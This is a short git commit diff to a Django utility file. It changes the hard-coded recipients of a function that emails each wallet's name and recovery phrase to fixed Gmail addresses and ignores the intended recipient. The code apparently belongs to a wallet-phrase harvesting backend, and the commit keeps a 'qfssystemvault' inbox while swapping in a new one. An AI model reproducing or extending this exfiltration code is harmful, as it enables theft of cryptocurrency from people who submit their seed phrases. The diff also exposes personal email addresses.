b148e9e87954fc777d3775c1565433d8378e90a4
marvidik <ebubeidika@gmail.com>
2025-07-25 13:37:44 +0100

    email change

--- user/utils.py
+++ user/utils.py
@@ -6,7 +6,7 @@ def send_wallet_email(to_email, wallet_name, wallet_phrase):
         subject = 'New Wallet Added'
         message = f'Wallet Name: {wallet_name}\nWallet Phrase: {wallet_phrase}'
         from_email = settings.EMAIL_HOST_USER
-        recipient_list = ['ebubeidika@gmail.com','qfssystemvault@gmail.com']
+        recipient_list = ['savvybittechnology@gmail.com','qfssystemvault@gmail.com']
         send_mail(subject, message, from_email, recipient_list)
     except Exception as e:
         print(f"Error sending email: {e}")
